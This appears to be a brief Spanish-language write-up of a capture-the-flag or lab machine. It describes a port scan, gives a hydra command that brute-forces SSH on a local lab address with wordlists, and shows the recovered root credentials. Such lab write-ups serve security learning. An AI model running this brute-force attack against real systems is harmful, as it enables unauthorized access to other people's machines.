

Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:
<img width="1638" height="247" alt="1Escaneo" src="https://github.com/user-attachments/assets/5726fba1-8bb5-4769-a206-4f2c4ba2c4ce" />


<img width="1312" height="311" alt="2Escaneopuerto" src="https://github.com/user-attachments/assets/adc97929-4167-4c56-803f-9d083881e5cb" />


hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/rockyou.txt ssh://172.17.0.2 -s 22 -t 15


<img width="1920" height="249" alt="3Hydra" src="https://github.com/user-attachments/assets/2c9b0046-fd5d-46de-ad79-25a5246a178c" />


[22][ssh] host: 172.17.0.2   login: root   password: estrella

<img width="1120" height="403" alt="Fin" src="https://github.com/user-attachments/assets/c0db21ce-a0ff-408a-ae13-91500b5b7cde" />
